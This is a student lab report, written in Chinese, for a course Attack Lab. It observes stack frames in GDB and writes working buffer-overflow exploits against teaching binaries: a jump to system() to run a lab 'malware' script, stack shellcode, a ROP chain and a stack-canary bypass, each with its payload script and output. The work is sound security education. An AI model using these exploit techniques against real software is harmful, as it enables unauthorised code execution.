# Lab 3 Attack Lab 实验报告

姓名：王安琪
学号：25803050106

## GDB 与 GEF 栈帧观察

实验程序：`attack/dark-calc`

在 GDB 中使用以下命令，在 `input` 函数处设置断点并运行程序：

```gdb
b input
r
```

程序停止时，GEF 显示当前位于 `input` 函数中：

```text
#0  0x40197b -> input()
#1  0x401ad1 -> main()
```

### 1. `input` 函数的调用者

GEF 的 `trace` 部分显示，当前栈帧 `#0` 是 `input()`，它的上一层栈帧 `#1` 是 `main()`。因此，`input` 函数由 `main` 函数调用。

### 2. `input` 的前三条指令及 `$rbp` 中保存的值

`input` 函数开头的三条指令为：

```asm
0x401977 <input+0>: push rbp
0x401978 <input+1>: mov  rbp, rsp
0x40197b <input+4>: sub  rsp, 0x10
```

它们组成了 `input` 的函数序言（prologue），作用如下：

1. `push rbp` 将调用者 `main` 原来的帧指针压入栈中，以便函数返回时恢复。
2. `mov rbp, rsp` 将当前的栈顶设置为 `input` 的栈帧基址。
3. `sub rsp, 0x10` 将栈指针向低地址移动 16 字节，为 `input` 的局部变量分配空间。

断点处的相关寄存器和栈内容为：

```text
$rbp  = 0x0000721000800fe0
[$rbp] = 0x0000721000800ff0
```

因此，`$rbp` 当前指向的内存中保存的是调用者 `main` 原来的 `$rbp`。该值由 `input` 开头的 `push rbp` 指令压入栈中。

断点停止时 `$rip` 指向 `sub rsp, 0x10`，说明前两条指令已经执行，而第三条指令尚未执行。

### 3. `$rbp + 8` 处保存的值

GEF 的 `stack` 部分显示：

```text
0x0000721000800fe8│+0x0008: 0x0000000000401ad1 -> <main+000e> mov eax, 0x0
```

因此：

```text
[$rbp + 8] = 0x401ad1
```

这个值是 `input` 的返回地址，对应 `main` 中调用 `input` 后的下一条指令：

```asm
0x401ad1 <main+14>: mov eax, 0
```

当 `input` 执行完毕后，程序会返回到 `0x401ad1`，继续执行 `main`。

### 4. 返回地址的来源

在 GDB 中反汇编 `main`：

```gdb
disas main
```

根据返回地址 `0x401ad1` 可以确定，调用 `input` 的指令位于 `0x401acc`：

```asm
0x401acc <main+9>:  call 0x401977 <input>
0x401ad1 <main+14>: mov  eax, 0
```

可以在 `call` 指令处设置断点并逐指令观察：

```gdb
delete breakpoints
b *0x401acc
r
x/4gx $rsp
si
x/4gx $rsp
```

执行 `call` 后，栈顶会出现返回地址：

```text
[$rsp] = 0x401ad1
```

所以，将 `0x401ad1` 写入栈中的是下面这条指令：

```asm
call 0x401977 <input>
```

在 x86-64 中，`call` 的效果可以表示为：

```text
rsp = rsp - 8
[rsp] = 0x401ad1
rip = 0x401977
```

进入 `input` 后，`push rbp` 再次将 `$rsp` 向低地址移动 8 字节，随后 `mov rbp, rsp` 建立新的栈帧。因此，原本位于栈顶的返回地址最终位于 `$rbp + 8`。

### 5. `call`、prologue、`leave` 和 `ret` 的作用

进入 `input` 并完成 prologue 后，栈帧结构如下：

```text
高地址
+-----------------------+
| 返回地址 0x401ad1     |  <- $rbp + 8
+-----------------------+
| main 原来的 rbp       |  <- $rbp
+-----------------------+
| input 的局部变量      |  <- $rbp - 0x10 ... $rbp - 1
+-----------------------+
低地址
```

#### `call`

`call input` 首先将下一条指令的地址 `0x401ad1` 压入栈中，然后将 `$rip` 修改为 `input` 的入口地址 `0x401977`。栈中的地址使被调用函数执行完毕后能够返回调用者。

#### Prologue

`input` 的 prologue 为：

```asm
push rbp
mov  rbp, rsp
sub  rsp, 0x10
```

它保存调用者的帧指针，建立当前函数的栈帧，并为局部变量分配 16 字节空间。

#### `leave`

`leave` 用于销毁当前函数的栈帧，它等价于：

```asm
mov rsp, rbp
pop rbp
```

`mov rsp, rbp` 释放 `input` 的局部变量空间；`pop rbp` 从栈中恢复 `main` 原来的 `$rbp`。执行完 `leave` 后，`$rsp` 指向返回地址 `0x401ad1`。

#### `ret`

`ret` 从栈顶取出返回地址并跳转到该地址，其效果可以表示为：

```text
rip = [rsp]
rsp = rsp + 8
```

因此，`ret` 最终将程序的控制流恢复到：

```asm
0x401ad1 <main+14>: mov eax, 0
```

整个函数调用和返回过程可以概括为：

```text
call 保存返回地址并跳转到 input
  -> prologue 保存调用者栈帧并建立 input 栈帧
  -> input 执行函数主体
  -> leave 释放 input 栈帧并恢复 main 的 rbp
  -> ret 取出返回地址并返回 main
```

## `gets` 导致的栈缓冲区溢出

`input` 在栈上分配了一个 16 字节的 `expression` 数组。数组大小中的 `+1` 用于保存 C 字符串末尾的空字符 `\0`。但是，`gets()` 不检查目标数组的大小，因此输入超过 15 个有效字符时会越过数组边界继续写入栈中。

反汇编显示，`gets` 的调用及其返回后的第一条指令为：

```asm
0x40199a <input+35>: call 0x401820 <gets@plt>
0x40199f <input+40>: test rax, rax
```

因此，在 `0x40199f` 设置断点，可以在 `gets` 完成写入后观察栈中的数据。

### 输入 20 个字符

测试命令及结果为：

```bash
python3 -c 'print("A" * 20)' | ./dark-calc
```

程序能够继续执行并以状态码 `0` 正常退出。断点处的栈内容为：

```text
0x721000800fd0: 0x4141414141414141  0x4141414141414141
0x721000800fe0: 0x0000720041414141  0x0000000000401ad1
0x721000800ff0: 0x00007fffffffe420
```

前 16 个 `A` 填满了 `expression`。剩余 4 个 `A` 覆盖了 `$rbp` 处保存的旧帧指针的低 4 字节，随后 `gets` 添加的 `\0` 又覆盖了下一个字节。因此，保存的帧指针由原来的值变成了：

```text
[$rbp] = 0x0000720041414141
```

位于 `$rbp+8` 的返回地址仍然是 `0x401ad1`，没有被覆盖，所以第一次 `ret` 仍能返回到 `main`；不过此时保存的帧指针已经被改成了 `0x0000720041414141`，`input` 返回后 `main` 的 `rbp` 其实是这个坏值。

程序最终以状态码 `0` 退出，原因并不只是「返回地址没被破坏」：`main` 是个 `while(1)` 循环，返回后会再次调用 `input`。而我们的输入只有 20 个 `A`，管道已经耗尽，第二次 `gets` 读到 EOF 返回 `NULL`，于是 `input` 走 `puts(answer); exit(0)` 分支主动退出。也就是说，这个损坏的帧指针在被真正解引用之前，程序就已经通过 `exit(0)` 结束了，所以没有崩溃。

### 输入 32 个字符

测试命令及结果为：

```bash
python3 -c 'print("A" * 32)' | ./dark-calc
```

程序输出 `Segmentation fault (core dumped)`，退出状态码为 `139`。`139 = 128 + 11`，其中信号 11 是 `SIGSEGV`。

在 `gets` 返回后观察到：

```text
0x721000800fd0: 0x4141414141414141  0x4141414141414141
0x721000800fe0: 0x4141414141414141  0x4141414141414141
0x721000800ff0: 0x00007fffffffe400
```

32 个 `A` 的覆盖范围为：

```text
$rbp-0x10 ... $rbp-1   expression 数组，共 16 字节
$rbp      ... $rbp+7   保存的 rbp，共 8 字节
$rbp+8    ... $rbp+15  返回地址，共 8 字节
$rbp+16                 gets 添加的 \0
```

所以保存的帧指针和返回地址都被覆盖为：

```text
[$rbp]     = 0x4141414141414141
[$rbp + 8] = 0x4141414141414141
```

函数返回时，GDB 显示：

```text
rip = 0x4019d6 <input+95>  # ret
rsp = 0x721000800fe8
rbp = 0x4141414141414141
[$rsp] = 0x4141414141414141
```

`leave` 已经将被覆盖的值恢复到 `$rbp`，并使 `$rsp` 指向原返回地址所在的位置。随后 `ret` 尝试从栈顶取出 `0x4141414141414141` 作为目标地址。该值不是合法的代码地址，因此故障发生在 `ret` 指令处，程序收到 `SIGSEGV`。回溯中的伪栈帧也显示为：

```text
#0 0x4019d6             in input
#1 0x4141414141414141   in ??
```

## 任务：利用缓冲区漏洞执行 `./malware`

### 攻击目标

`attack/` 目录下的 `malware` 并不是二进制里的一个函数，而是一个 shell 脚本。它启动后会沿进程树向上查找名为 `dark-calc` 的进程：只有由 `dark-calc` 通过 `system()` 调起它时，才会输出：

```text
### The bomb was triggered by the dark-calc process. ###
### You have successfully detonated the bomb! Congratulations! ###
```

因此，攻击的目标就是让 `dark-calc` 执行 `system("./malware")`。

### 攻击思路

结合源码，`input` 会把自己的输入原样拷贝进全局变量 `command_buf`，`eval` 则把 `command_buf` 包成 `echo $((...))` 之后交给 `system` 执行。反汇编可以看到这两处：

```asm
; input 中：strcpy(command_buf, expression)
0x4019ca: mov  $0x6030d0, %edi       ; rdi = command_buf 的地址
0x4019cf: call 0x4017a0 <strcpy@plt>

; eval 中：system(command_buf)
0x401a6b: mov  $0x6030d0, %edi       ; rdi = command_buf 的地址
0x401a70: call 0x4017e0 <system@plt>
```

其中 `0x6030d0` 是全局变量 `command_buf` 的地址。既然 `input` 已经把我们输入的内容放进了 `command_buf`，那么只要**跳过 `eval` 里那段拼接 `echo $((` 和 `))` 的代码，直接跳到 `0x401a6b` 处的 `system` 调用**，`command_buf` 里的内容就会被当作命令原样执行。

于是问题转化为两件事：

1. 让 `command_buf` 的内容恰好等于 `./malware`；
2. 把 `input` 的返回地址覆盖成 `0x401a6b`。

### 构造 payload

这里用到一个关键技巧——在字符串中间内嵌一个 `\x00`：

- `gets()` 只在遇到换行或 EOF 时停止，中间的 `\x00` 会被当作普通字节继续写入，所以后面的溢出字节照常覆盖保存的 `rbp` 和返回地址；
- 而 `strlen()` / `strcpy()` 遇到 `\x00` 就停止，所以 `input` 里的 `strcpy` 只会把 `./malware` 拷进 `command_buf`。

想通这一点是整个任务的关键：`gets` 和 `strcpy` 对 `\x00` 的态度正好相反，一个把它当普通字节继续写，一个把它当字符串结尾。利用这个「分歧」，就能同时做到「继续溢出栈」和「让命令保持干净」。

payload 的布局如下：

```text
偏移 0  ...  9  : "./malware\x00"      → command_buf 最终为 "./malware"
偏移 10 ... 15  : 6 字节填充            → 填满 16 字节 expression
偏移 16 ... 23  : 8 字节填充            → 覆盖保存的 rbp
偏移 24 ... 31  : 0x401a6b（小端）      → 覆盖返回地址
```

对应代码（`payload.py`）：

```python
#!/usr/bin/env python3
import sys

payload = b"./malware\x00"                   # strcpy 之后 command_buf == "./malware"
payload += b"A" * (16 - 10)                   # 补齐 expression 到 16 字节
payload += b"B" * 8                            # 覆盖保存的 rbp
payload += (0x401a6b).to_bytes(8, "little")   # 返回地址 -> mov $0x6030d0,%edi; call system

sys.stdout.buffer.write(payload)
```

### 测试结果

在 `attack/` 目录下执行（`./malware` 是相对路径，必须保证当前工作目录是 `attack/`）：

```bash
python3 ../payload.py | ./dark-calc
```

输出为：

```text
Enter an expression (length up to 15):

./malware: 3: pstree: not found

### The bomb was triggered by the dark-calc process. ###
### You have successfully detonated the bomb! Congratulations! ###

Bus error (core dumped)
```

其中 `./malware: 3: pstree: not found` 是因为服务器上没有安装 `pstree`，脚本第 3 行执行失败；但脚本并未因此中断，后续的祖先进程检测仍正常完成，并判定本次调用来自 `dark-calc`。

最后的 `Bus error (core dumped)` 是因为我们直接跳进了 `eval` 函数中部，绕过了它的 prologue：`system` 返回后，程序继续执行到 `eval` 结尾的 `leave; ret`，而此刻 `rbp` 寄存器里还是 `input` 的 `leave` 弹出时得到的填充值 `0x4242424242424242`，`leave` 把它当作栈指针访问了非法地址。该崩溃发生在成功信息打印之后，不影响攻击结果。

## 用 GDB 检查 `main` 函数的机器码

在 `input` 断点处执行 `disas main`，`main` 的前三行汇编及地址为：

```asm
0x0000000000401ac3 <+0>:  push   rbp
0x0000000000401ac4 <+1>:  mov    rbp,rsp
0x0000000000401ac7 <+4>:  mov    eax,0x0
```

使用 `x/9bx 0x401ac3` 从第一条指令的起始地址向高地址方向检查 9 个字节：

```text
0x401ac3 <main>:   0x55 0x48 0x89 0xe5 0xb8 0x00 0x00 0x00
0x401acb <main+8>: 0x00
```

### 1. 前三行汇编对应的机器码

| 汇编指令 | 起始地址 | 机器码 | 长度 |
|---|---|---|---|
| `push rbp` | `0x401ac3` | `55` | 1 字节 |
| `mov rbp, rsp` | `0x401ac4` | `48 89 e5` | 3 字节 |
| `mov eax, 0x0` | `0x401ac7` | `b8 00 00 00 00` | 5 字节 |

### 2. 机器码在内存中的排列方式

x86-64 的指令是变长的，各条指令占用的字节数不同，前一条指令的结束地址就是下一条指令的开始地址。上面三条指令共占 `1 + 3 + 5 = 9` 字节，从 `0x401ac3` 连续排列到 `0x401acb`，紧接其后的 `call input` 从 `0x401acc` 开始：

```text
低地址
0x401ac3 : 55                      ┐
0x401ac4 : 48 89 e5                │ 9 字节连续存放
0x401ac7 : b8 00 00 00 00          ┘
0x401acc : e8 a6 fe ff ff          ← call input 从这里开始
高地址
```

三条指令各自占用的内存区间为：

```text
push rbp      : 0x401ac3 ~ 0x401ac3   （1 字节）
mov rbp, rsp  : 0x401ac4 ~ 0x401ac6   （3 字节）
mov eax, 0x0  : 0x401ac7 ~ 0x401acb   （5 字节）
```

关于字节序与编码：x86-64 采用小端 (little-endian) 存储。例如 `mov eax, 0x0` 的机器码 `b8 00 00 00 00` 中，`b8` 是操作码（`mov r32, imm32`，`eax` 对应寄存器编号 0），后面 4 个字节是立即数 `0` 的小端表示；`mov rbp, rsp` 中 `48` 是 REX.W 前缀（64 位操作数）、`89` 是操作码、`e5` 是 ModRM 字节（`mod=11` 寄存器寻址，`reg=rsp`、`r/m=rbp`）；`push rbp` 只有 1 字节 `55`，即 `push r64` 的操作码 `0x50` 加上 `rbp` 的寄存器编号 `5`。

## 任务：栈空间执行（调用 `grade_eval`）

### 目标与思路

`dark-calc` 中有一个未被调用的函数 `grade_eval(int grade)`：

```c
void grade_eval(int grade) {
  if(grade == 4) printf("\n\033[31m Hope %c will be your grade! \n", 4 - grade + 'A');
  fflush(stdout);
  return;
}
```

当 `grade == 4` 时它会输出 `Hope A will be your grade!`。本任务要求把 `rip` 指向栈上我们自己写入的机器码，由这段机器码以 `grade = 4` 调用 `grade_eval`。

为什么栈上能执行代码：程序启动时 `init_fixed_stack` 用 `mmap` 在固定地址 `0x721000000000` 映射了一块 **RWX**（`prot=0x7`，可读可写可执行）内存作为固定栈，`input` 的 `expression` 缓冲区固定位于 `0x721000800fd0`，且每次运行地址不变。

反汇编 `grade_eval` 可见它通过 `edi` 接收参数：

```asm
0x401a8f: mov  DWORD PTR [rbp-0x4], edi   ; 把参数存入局部变量
0x401a92: cmp  DWORD PTR [rbp-0x4], 0x4   ; 判断是否等于 4
0x401a96: jne  0x401ab1                    ; 不等于则跳过打印
...
0x401aac: call printf@plt                  ; 等于 4 时打印消息
```

因此，按 x86-64 调用约定把 `edi` 置为 `4`，再跳转到 `grade_eval`（`0x401a87`）即可。

### 编写 shellcode

在栈上执行的 shellcode 只有三句：

```asm
mov edi, 4          ; grade = 4
mov eax, 0x401a87   ; grade_eval 的地址
call rax            ; 调用 grade_eval(4)
```

对应的机器码（共 12 字节）：

```text
bf 04 00 00 00      mov edi, 4
b8 87 1a 40 00      mov eax, 0x401a87
ff d0               call rax
```

### 构造 payload

把 shellcode 放在 `expression` 开头（`0x721000800fd0`），补齐 24 字节后，把返回地址覆盖为 shellcode 的地址：

```python
#!/usr/bin/env python3
import sys

shellcode = b"\xbf\x04\x00\x00\x00" \
            b"\xb8\x87\x1a\x40\x00" \
            b"\xff\xd0"

payload = shellcode
payload += b"A" * (24 - len(shellcode))            # 补齐到 24 字节
payload += (0x721000800fd0).to_bytes(8, "little")  # 返回地址 -> shellcode

sys.stdout.buffer.write(payload)
```

注意：shellcode 里含有 `\x00` 字节。`gets` 只在换行/EOF 处停止，中间的空字节会被照常写入栈；而 `input` 里的 `strlen` 只看到第一个空字节（长度为 2），非 0，因此程序不会提前退出。

### 测试结果

```bash
python3 ../payload_dark.py | ./dark-calc
```

```text
Enter an expression (length up to 15):

 Hope A will be your grade! 
Segmentation fault (core dumped)
```

`Hope A will be your grade!` 已成功打印。

最后的 `Segmentation fault` 是预期内的：`grade_eval` 打印并 `fflush` 后返回，返回地址指向 shellcode 中 `call rax` 之后的位置（`0x721000800fdc`）；但该位置恰好落在 `grade_eval` 自己的栈帧里（它把参数 `grade` 存在 `[rbp-4]`，正是 `0x721000800fdc`），这些字节在调用期间被覆盖，返回后 CPU 继续执行这段无效字节因而崩溃。由于目标信息在此之前已经打印并刷新，崩溃不影响攻击结果。

## 楚门的世界：ASLR 与位置无关代码

### ASLR 实验

`src/aslr.c` 打印一个栈上局部变量的地址：

```c
int main() {
  int i = 42;
  printf("%p\n", &i);
  return 0;
}
```

编译并多次运行：

```bash
cc -o aslr aslr.c
./aslr
```

五次运行的地址各不相同：

```text
0x7ffc92922484
0x7ffea70988d4
0x7ffe60260ac4
0x7ffc58e01cb4
0x7ffcea6f6414
```

这是因为现代系统默认开启 ASLR，每次进程启动时栈的起始地址都被随机化，所以同一个局部变量的地址每次都不同。

而在 GDB 中多次运行，三次打印的地址完全相同：

```text
0x7fffffffe384
0x7fffffffe384
0x7fffffffe384
```

这是因为 GDB 为了调试方便，默认会禁用被调试程序的 ASLR。

### 与前面两个任务的对照

前面的 `dark-calc` 之所以能直接在栈上执行 shellcode，是因为它用 `mmap` 在固定地址 `0x721000000000` 建立了一块 **RWX**（可读可写可执行）的固定栈，并由 `__wrap_main` 把 `rsp` 切换到这块栈顶，这等于同时绕过了「栈不可执行」和「ASLR」两道防线。而下一个任务使用的 `dark-calc-nx` 栈不可执行，因此需要改用 ROP，用代码段中固定地址的 gadget 拼出攻击链。

## 任务：ROP（Return-Oriented Programming）

### 背景与思路

`dark-calc-nx` 的栈不可执行（NX）且地址随机（ASLR），因此既不能像 `dark-calc` 那样在栈上执行 shellcode，也不能硬编码栈地址。但它是 non-PIE 程序，代码段地址固定。ROP 的思路是：在代码段中寻找以 `ret`（`0xc3`）结尾的指令片段（gadget），借助 `ret` 让控制流在多个 gadget 之间跳转，拼出我们想要的操作。

目标仍然是让 `grade_eval`（在 `dark-calc-nx` 中地址为 `0x401978`）以 `edi = 4` 被调用。

### 寻找 gadget

反汇编 `__libc_csu_init` 末尾，可以看到一串连续的 pop：

```asm
401a2a: 5b            pop rbx
401a2b: 5d            pop rbp
401a2c: 41 5c         pop r12
401a2e: 41 5d         pop r13
401a30: 41 5e         pop r14
401a32: 41 5f         pop r15
401a34: c3            ret
```

注意 `0x401a32` 的字节是 `41 5f`（即 `pop r15`，`41` 是 REX 前缀），`0x401a34` 是 `c3`。如果从 `0x401a33` 的 `5f` 字节开始执行，就得到 `pop rdi; ret`：

```text
pop rdi; ret  →  0x401a33
ret           →  0x401a34
```

`pop rdi` 这个 gadget 并不是一条现成的指令，而是藏在 `pop r15`（`41 5f`）的第二个字节里——从 `0x401a33` 跳进去才「凑」出 `pop rdi; ret`。这种「从指令中间进入」来找 gadget 的办法，是我做 ROP 时觉得最有意思的一点。

### 栈对齐问题

链里最终要调用 `grade_eval` 内部的 `printf`，而 glibc 的 `printf` 内部会用 `movaps` 访问栈，要求栈 16 字节对齐。直接 `ret` 跳进 `grade_eval` 时栈会错位 8 字节，导致 `printf` 崩在打印之前。解决办法是在链的最前面多加一个 `ret`，把栈向下多移 8 字节以恢复对齐。

### ROP 链布局

返回地址被覆盖后，程序依次执行：

```text
ret            (0x401a34)   → 栈对齐
pop rdi; ret   (0x401a33)   → rdi = 4
4                           → 参数
grade_eval     (0x401978)   → 打印消息
```

对应 `payload_rop.py`：

```python
#!/usr/bin/env python3
import sys

payload = b"A" * 24
payload += (0x401a34).to_bytes(8, "little")  # ret（栈对齐）
payload += (0x401a33).to_bytes(8, "little")  # pop rdi; ret
payload += (4).to_bytes(8, "little")         # rdi = 4
payload += (0x401978).to_bytes(8, "little")  # grade_eval

sys.stdout.buffer.write(payload)
```

### 测试结果

```bash
python3 ../payload_rop.py | ./dark-calc-nx
```

```text
Enter an expression (length up to 15):

 Hope A will be your grade! 
Segmentation fault (core dumped)
```

`Hope A will be your grade!` 打印成功。最后的 `Segmentation fault` 是预期内的：`grade_eval` 打印并 `fflush` 后返回，此时 `rsp` 指向 ROP 链之后的栈内容（不在我们控制的范围内），`ret` 跳到无效地址而崩溃；消息在此之前已经打印，不影响结果。

## 任务：Canary（绕过 Stack Protector）

### 背景与漏洞

`dark-log` 在编译时开启了 Stack Protector（金丝雀/Canary）：编译器在局部缓冲区与保存的返回地址之间插入一个随机值，函数返回前校验它是否被改动，若被改动则调用 `__stack_chk_fail` 终止程序。

`dark-log` 的 `input` 使用了一个结构体：

```c
struct log_frame {
  char expression[128];
  char logMsg[128];
  int len;
  char pad[8];
};

void input(void) {
  struct log_frame f;
  f.len = 0;
  puts("Enter a log message:");
  if (gets(f.expression) == NULL) return;
  memcpy(f.logMsg + f.len, f.expression, sizeof(f.expression));
  return;
}
```

漏洞点在于 `memcpy(f.logMsg + f.len, f.expression, 128)`：**复制目标地址由 `f.len` 决定**。`gets` 虽然能溢出 `expression`，但一路写到返回地址会碰坏金丝雀；然而我们只需要溢出到 `len` 把它改掉，再借 `memcpy` 把 `expression` 的 128 字节写到返回地址处，就绕过了金丝雀。

一开始我按前几个任务的老思路直接一路覆盖返回地址，结果程序直接 `*** stack smashing detected ***` 退出。回过头才注意到 `memcpy` 的目标是 `logMsg + len`，而 `len` 本身就在溢出范围内——与其硬碰金丝雀，不如借用程序自己的 `memcpy` 把返回地址写掉。这正是这个任务设计得巧妙的地方。

### 栈上布局

反汇编 `input`（`sub rsp,0x120`）可知各字段相对 `rbp` 的偏移：

```text
expression : rbp-0x120  (128 字节)   ← gets 写入，向高地址溢出
logMsg     : rbp-0xa0   (128 字节)
len        : rbp-0x20   (4 字节)
pad        : rbp-0x1c   (8 字节)
[空隙]     : rbp-0x14 ~ rbp-0x9
canary     : rbp-0x8    (8 字节)     ← 不能碰
saved rbp  : rbp
返回地址    : rbp+8
```

`memcpy` 的目标地址 = `logMsg + len` = `rbp-0xa0 + len`（`len` 经 `cltq` 符号扩展后相加；反汇编里 `0x401725: sub $0xffffffffffffff80,%rdx` 即 `rdx += 0x80` 得到 `&logMsg`）。要让目标 = 返回地址 `rbp+8`，取 `len = 0xa8 = 168`。

### 攻击流程

1. payload 本身是 268 字节，填满 `expression`(128) + `logMsg`(128) + `len`(4) + `pad`(8)；`gets` 随后还会在偏移 268 写入一个终止空字节 `\0`，这个位置仍处于金丝雀（偏移 280）之前的 padding 空隙里，所以不会破坏金丝雀；
2. 其中 `len` 被改为 `168`，于是 `memcpy` 把 `expression[0..127]` 复制到 `rbp+8`（返回地址）开始的位置；
3. 返回地址被 ROP 链覆盖，而金丝雀校验通过；
4. `leave; ret` 进入 ROP 链。

`expression` 里放的 ROP 链与前一个任务相同：

```text
ret          (0x4018a4)  → 栈对齐
pop rdi; ret (0x4018a3)  → rdi = 4
4
grade_eval   (0x401677)  → 打印消息
```

（`grade_eval` 地址为 `0x401677`；`__libc_csu_init` 末尾 `0x4018a2` 的字节 `41 5f c3` 中，从 `0x4018a3` 起是 `pop rdi; ret`，`0x4018a4` 是 `ret`。）

### payload_canary.py

```python
#!/usr/bin/env python3
import sys

rop = b""
rop += (0x4018a4).to_bytes(8, "little")  # ret（栈对齐）
rop += (0x4018a3).to_bytes(8, "little")  # pop rdi; ret
rop += (4).to_bytes(8, "little")         # rdi = 4
rop += (0x401677).to_bytes(8, "little")  # grade_eval
rop += b"P" * (128 - len(rop))           # 补齐到 128 字节

payload = rop                          # 0..127   expression
payload += b"F" * 128                  # 128..255 logMsg（填充）
payload += (168).to_bytes(4, "little") # 256..259 len = 168 -> memcpy 目标 = rbp+8
payload += b"G" * 8                    # 260..267 pad（填充）

sys.stdout.buffer.write(payload)
```

### 测试结果

```bash
python3 ../payload_canary.py | ./dark-log
```

```text
Enter a log message:

 Hope A will be your grade! 
Segmentation fault (core dumped)
```

`Hope A will be your grade!` 打印成功，说明金丝雀被绕过。最后的 `Segmentation fault` 同样是预期内的：`grade_eval` 打印并 `fflush` 后返回，`rsp` 已超出我们控制的链范围，`ret` 跳到无效地址而崩溃，不影响结果。

### 思考：如何重排局部变量使攻击失效

本次攻击能成立，是因为结构体把缓冲区 `expression` 和整数 `len` 按「`expression` 在低地址、`len` 在高地址」的顺序固定排布，`gets(expression)` 向高地址溢出时能先覆盖 `len`、再借 `memcpy` 改写返回地址。

要使其失效，应当把可溢出的字符数组（`expression`、`logMsg`）放到**离金丝雀最近的高地址端**，而把 `len` 等标量/控制变量放到**低地址端**（即让 `len` 的地址低于 `expression`）。这样：

- 栈溢出只能向高地址方向写，`len` 在更低地址，无法被 `gets(expression)` 覆盖；
- 溢出超过缓冲区后，第一个被破坏的就是金丝雀，`__stack_chk_fail` 会立即被触发。

这正是现代编译器开启 `-fstack-protector` 并配合优化时的做法之一：把数组局部变量重排到紧邻金丝雀的位置，把标量放到远离缓冲区的低地址，从而让溢出「要么无害、要么立刻被金丝雀发现」，而无法先静默篡改其他变量。

## 实验总结

从「观察栈帧」一路做到「绕过 Canary」，这次实验让我对调用栈、函数调用约定和几类经典内存漏洞有了很具体的感觉。几个印象比较深的地方：

- `call` / `ret` 本质上就是在栈上压入、弹出返回地址，所谓「控制流劫持」说到底就是改写这个返回地址；
- 同一个缓冲区溢出，撞上不同的防御机制（NX、ASLR、Canary）会逼出完全不同的利用思路：从直接写 shellcode，到用固定代码段的 gadget 拼 ROP，再到借用程序自己的 `memcpy` 绕金丝雀；
- 不少细节只有真正动手才会注意到：`gets` 与 `strcpy` 对 `\x00` 的处理相反、`printf` 内部的 16 字节栈对齐、gadget 藏在 `pop r15` 的第二个字节里……

安全机制从来不是一劳永逸的：每加一层防御，攻击者就会找到新的绕法，攻防双方就是这样持续迭代的。
